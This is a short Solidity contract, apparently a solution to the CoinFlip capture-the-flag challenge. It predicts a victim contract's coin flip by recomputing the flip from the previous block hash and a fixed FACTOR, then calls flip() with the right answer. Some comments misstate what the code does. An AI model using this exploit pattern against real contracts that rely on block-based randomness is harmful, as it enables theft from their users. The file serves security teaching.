// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlipCoin.sol";

contract FlipCoinS {
    // Create a state variable to represent CoinFlip contract + FACTOR
    FlipCoin public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor(address _victimContract) {
        victimContract = FlipCoin(_victimContract);
    }

    // create functionality to memic the target contracts answer
    function attack() external payable {
        // stimulate the same behavior of what the challenge contract does.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // Take the blockValue and divide by the random seed FACTOR to increase randomness
        uint256 coinFlip = uint256(blockValue / FACTOR);
        bool side = coinFlip == 1 ? true : false;

        // Call flip on the victim contract and pass our guess (e.g side)
        victimContract.flip(side);
    }
    
    receive() external payable {}
 
}


